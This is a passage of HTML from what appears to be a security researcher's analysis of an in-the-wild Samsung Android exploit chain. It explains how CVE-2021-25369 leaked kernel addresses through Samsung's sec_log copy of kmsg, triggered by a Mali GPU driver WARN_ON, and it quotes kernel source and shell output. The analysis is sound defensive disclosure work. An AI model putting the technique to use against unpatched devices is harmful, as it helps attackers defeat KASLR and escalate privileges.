 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>Once the ELF file is loaded via the </span><span class="vdnyYxSRCi-c2">System.load</span><span class="vdnyYxSRCi-c7">&nbsp;api, it begins executing. It includes two additional exploits to gain kernel read and write privileges as the root user.</span></p><h1 class="vdnyYxSRCi-c28 vdnyYxSRCi-c8" id="h.4iueiufi5tqe"><span class="vdnyYxSRCi-c31">Vulnerability #2 - task_struct and sys_call_table address leak</span></h1>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>Once the second stage ELF is running (and as system), the exploit then continues. The second vulnerability (CVE-2021-25369) used by the chain is an information leak to leak the address of the </span><span class="vdnyYxSRCi-c2">task_struct</span><span>&nbsp;and </span><span class="vdnyYxSRCi-c2">sy</span><span class="vdnyYxSRCi-c2">s_call_tab</span><span class="vdnyYxSRCi-c2">le</span><span>. The leaked </span><span class="vdnyYxSRCi-c2">sys_call_table</span><span>&nbsp;address is used to defeat KASLR. The </span><span class="vdnyYxSRCi-c2">addr_limit</span><span>&nbsp;pointer, which is used later to gain arbitrary kernel read and write, is calculated from the leaked </span><span class="vdnyYxSRCi-c2">task_struct</span><span class="vdnyYxSRCi-c7">&nbsp;address.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The vulnerability is in the access permissions of a custom Samsung logging file: </span><span class="vdnyYxSRCi-c2">/data/log/sec_log.log</span><span class="vdnyYxSRCi-c7">.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span class="vdnyYxSRCi-c7"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTUlyiPJg1awjnkx_0jTgZw-hLYtjWLrtD4kRaCW0J6sj9FGrAbEgC_nDgM36G5ctdm9r1iHukN2Wt7YivoW1znRECs_cNdoISTW_mzkF0Ylh48-zsoLsEzlWOJ8iLnSFejIzSYGG5t7lbfNMuNt3v-01FpJcWsYQmtT01kB3AQVV58nSgiCKmjqOa/s1103/image3.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTUlyiPJg1awjnkx_0jTgZw-hLYtjWLrtD4kRaCW0J6sj9FGrAbEgC_nDgM36G5ctdm9r1iHukN2Wt7YivoW1znRECs_cNdoISTW_mzkF0Ylh48-zsoLsEzlWOJ8iLnSFejIzSYGG5t7lbfNMuNt3v-01FpJcWsYQmtT01kB3AQVV58nSgiCKmjqOa/s1103/image3.png" border="0" alt="Screenshot of the CVE-2021-25369 entry from Samsung&#39;s March 2021 security update. It reads: &amp;quot;SVE-2021-19897 (CVE-2021-25369): Potential kernel information exposure from sec_log &nbsp;Severity: Moderate Affected versions: O(8.x), P(9.0), Q(10.0) Reported on: December 10, 2020 Disclosure status: Privately disclosed. An improper access control vulnerability in sec_log file prior to SMR MAR-2021 Release 1 exposes sensitive kernel information to userspace. The patch removes vulnerable file." style="max-height: 750px; max-width: 600px;"title="Screenshot of the CVE-2021-25369 entry from Samsung&#39;s March 2021 security update. It reads: &amp;quot;SVE-2021-19897 (CVE-2021-25369): Potential kernel information exposure from sec_log &nbsp;Severity: Moderate Affected versions: O(8.x), P(9.0), Q(10.0) Reported on: December 10, 2020 Disclosure status: Privately disclosed. An improper access control vulnerability in sec_log file prior to SMR MAR-2021 Release 1 exposes sensitive kernel information to userspace. The patch removes vulnerable file." /></a></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The exploit abused a </span><span class="vdnyYxSRCi-c2">WARN_ON</span><span>&nbsp;in order to leak the two kernel addresses and therefore break ASLR</span><span class="vdnyYxSRCi-c2">.</span><span>&nbsp;</span><span class="vdnyYxSRCi-c2">WARN_ON</span><span>&nbsp;is intended to only be used in situations where a kernel bug is detected because it prints a full backtrace, including stack trace and register values, to the kernel logging buffer, </span><span class="vdnyYxSRCi-c2">/dev/kmsg</span><span class="vdnyYxSRCi-c7">. </span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c2 vdnyYxSRCi-c33 vdnyYxSRCi-c44"></span></p><a id="t.dac6441018d72ea602c04b6dc61a0ad5d92c980f"></a><a id="t.5"></a><table class="vdnyYxSRCi-c23"><tr class="vdnyYxSRCi-c19"><td class="vdnyYxSRCi-c10" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">oid __warn</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c5">const</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">char</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">*</span><span class="vdnyYxSRCi-c4">file</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">int</span><span class="vdnyYxSRCi-c4">&nbsp;line</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">void</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">*</span><span class="vdnyYxSRCi-c5">caller</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">unsigned</span><span class="vdnyYxSRCi-c4">&nbsp;taint</span><span class="vdnyYxSRCi-c0">,</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">struct</span><span class="vdnyYxSRCi-c4">&nbsp;pt_regs </span><span class="vdnyYxSRCi-c0">*</span><span class="vdnyYxSRCi-c4">regs</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">struct</span><span class="vdnyYxSRCi-c4">&nbsp;warn_args </span><span class="vdnyYxSRCi-c0">*</span><span class="vdnyYxSRCi-c4">args</span><span class="vdnyYxSRCi-c0">)</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; disable_trace_on_warning</span><span class="vdnyYxSRCi-c0">();</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; pr_warn</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c18">&quot;------------[ cut here ]------------\n&quot;</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">file</span><span class="vdnyYxSRCi-c0">)</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pr_warn</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c18">&quot;WARNING: CPU: %d PID: %d at %s:%d %pS\n&quot;</span><span class="vdnyYxSRCi-c0">,</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; raw_smp_processor_id</span><span class="vdnyYxSRCi-c0">(),</span><span class="vdnyYxSRCi-c4">&nbsp;current</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">pid</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;file</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;line</span><span class="vdnyYxSRCi-c0">,</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">caller</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">else</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pr_warn</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c18">&quot;WARNING: CPU: %d PID: %d at %pS\n&quot;</span><span class="vdnyYxSRCi-c0">,</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; raw_smp_processor_id</span><span class="vdnyYxSRCi-c0">(),</span><span class="vdnyYxSRCi-c4">&nbsp;current</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">pid</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">caller</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">args</span><span class="vdnyYxSRCi-c0">)</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; vprintk</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">args</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">fmt</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;args</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">args</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">panic_on_warn</span><span class="vdnyYxSRCi-c0">)</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c20">/*</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* This thread may hit another WARN() in the panic path.</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* Resetting this prevents additional WARN() from panicking the</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* system on this thread. &nbsp;Other threads are blocked by the</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* panic_mutex in panic().</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; panic_on_warn </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">0</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; panic</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c18">&quot;panic_on_warn set ...\n&quot;</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">}</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; print_modules</span><span class="vdnyYxSRCi-c0">();</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; dump_stack</span><span class="vdnyYxSRCi-c0">();</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; print_oops_end_marker</span><span class="vdnyYxSRCi-c0">();</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c20">/* Just a warning, don&#39;t kill lockdep. */</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; add_taint</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">taint</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;LOCKDEP_STILL_OK</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0">}</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p></td></tr></table>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c2 vdnyYxSRCi-c33 vdnyYxSRCi-c44"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>On Android, the ability to read from </span><span class="vdnyYxSRCi-c2">kmsg</span><span>&nbsp;is scoped to privileged users and contexts. </span><span>While </span><span class="vdnyYxSRCi-c2">kmsg</span><span>&nbsp;is readable by </span><span class="vdnyYxSRCi-c2">system_server</span><span>, it is not readable from the </span><span class="vdnyYxSRCi-c2">system_app</span><span>&nbsp;context, which means it&rsquo;s not readable by the e</span><span>xploit.</span><span class="vdnyYxSRCi-c7">&nbsp;</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p><a id="t.1187718de85bb2eac5503bd22ce0d6a9ea90e292"></a><a id="t.6"></a><table class="vdnyYxSRCi-c23"><tr class="vdnyYxSRCi-c19"><td class="vdnyYxSRCi-c10" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">a51</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c18">/ $ ls -alZ /</span><span class="vdnyYxSRCi-c4">dev</span><span class="vdnyYxSRCi-c0">/</span><span class="vdnyYxSRCi-c3">kmsg</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">crw</span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c4">rw</span><span class="vdnyYxSRCi-c0">----</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">1</span><span class="vdnyYxSRCi-c4">&nbsp;root system u</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">object_r</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">kmsg_device</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">s0 </span><span class="vdnyYxSRCi-c13">1</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">11</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">2022</span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c13">10</span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c13">27</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">21</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c13">48</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">/</span><span class="vdnyYxSRCi-c4">dev</span><span class="vdnyYxSRCi-c0">/</span><span class="vdnyYxSRCi-c3">kmsg</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">$ sesearch </span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c4">A </span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c4">s system_server </span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c4">t kmsg_device </span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c3">p read precompiled_sepolicy</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow domain dev_type</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">lnk_file </span><span class="vdnyYxSRCi-c0">{</span><span class="vdnyYxSRCi-c4">&nbsp;getattr ioctl </span><span class="vdnyYxSRCi-c5">lock</span><span class="vdnyYxSRCi-c4">&nbsp;map open read </span><span class="vdnyYxSRCi-c0">};</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow system_server kmsg_device</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">chr_file </span><span class="vdnyYxSRCi-c0">{</span><span class="vdnyYxSRCi-c4">&nbsp;append getattr ioctl </span><span class="vdnyYxSRCi-c5">lock</span><span class="vdnyYxSRCi-c4">&nbsp;map open read write </span><span class="vdnyYxSRCi-c0">};</span></p></td></tr></table>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>Samsung however has added a custom logging feature that copies </span><span class="vdnyYxSRCi-c2">kmsg</span><span>&nbsp;to the </span><span class="vdnyYxSRCi-c2">sec_log</span><span>. The </span><span class="vdnyYxSRCi-c2">sec_log</span><span>&nbsp;is a file found at </span><span class="vdnyYxSRCi-c2">/data/log/sec_log.log</span><span class="vdnyYxSRCi-c7">. </span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The </span><span class="vdnyYxSRCi-c2">WARN_ON</span><span>&nbsp;that the exploit triggers is in the Mali GPU graphics driver provided by ARM. ARM replaced the </span><span class="vdnyYxSRCi-c2">WARN_ON</span><span>&nbsp;with a call to the more appropriate helper </span><span class="vdnyYxSRCi-c2">pr_warn</span><span>&nbsp;in </span><span class="vdnyYxSRCi-c24"><a class="vdnyYxSRCi-c61" href="https://developer.arm.com/downloads/-/mali-drivers/bifrost-kernel">release BX304L01B-SW-99002-r21p0-01rel1 in February 2020</a></span><span class="vdnyYxSRCi-c7">. However, the A51 (SM-A515F) and A50 (SM-A505F) &nbsp;still used a vulnerable version of the driver (r19p0) as of January 2021. &nbsp;</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p><a id="t.f06791a45fc9ef7d932e2432c73114a95e71a32c"></a><a id="t.7"></a><table class="vdnyYxSRCi-c23"><tr class="vdnyYxSRCi-c19"><td class="vdnyYxSRCi-c10" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">/**</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp;* kbasep_vinstr_hwcnt_reader_ioctl() - hwcnt reader&#39;s ioctl.</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp;* @filp: &nbsp; Non-NULL pointer to file structure.</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp;* @cmd: &nbsp; &nbsp;User command.</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp;* @arg: &nbsp; &nbsp;Command&#39;s argument.</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp;*</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp;* Return: 0 on success, else error code.</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp;*/</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c5">static</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">long</span><span class="vdnyYxSRCi-c4">&nbsp;kbasep_vinstr_hwcnt_reader_ioctl</span><span class="vdnyYxSRCi-c0">(</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">struct</span><span class="vdnyYxSRCi-c4">&nbsp;file </span><span class="vdnyYxSRCi-c0">*</span><span class="vdnyYxSRCi-c4">filp</span><span class="vdnyYxSRCi-c0">,</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">unsigned</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">int</span><span class="vdnyYxSRCi-c4">&nbsp;cmd</span><span class="vdnyYxSRCi-c0">,</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">unsigned</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">long</span><span class="vdnyYxSRCi-c4">&nbsp;arg</span><span class="vdnyYxSRCi-c0">)</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">long</span><span class="vdnyYxSRCi-c4">&nbsp;rcode</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">struct</span><span class="vdnyYxSRCi-c4">&nbsp;kbase_vinstr_client </span><span class="vdnyYxSRCi-c0">*</span><span class="vdnyYxSRCi-c4">cli</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(!</span><span class="vdnyYxSRCi-c4">filp </span><span class="vdnyYxSRCi-c0">||</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">_IOC_TYPE</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">cmd</span><span class="vdnyYxSRCi-c0">)</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">!=</span><span class="vdnyYxSRCi-c4">&nbsp;KBASE_HWCNT_READER</span><span class="vdnyYxSRCi-c0">))</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">return</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c4">EINVAL</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; cli </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;filp</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">private_data</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(!</span><span class="vdnyYxSRCi-c4">cli</span><span class="vdnyYxSRCi-c0">)</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">return</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c4">EINVAL</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">switch</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">cmd</span><span class="vdnyYxSRCi-c0">)</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">case</span><span class="vdnyYxSRCi-c4">&nbsp;KBASE_HWCNT_READER_GET_API_VERSION</span><span class="vdnyYxSRCi-c0">:</span></p>
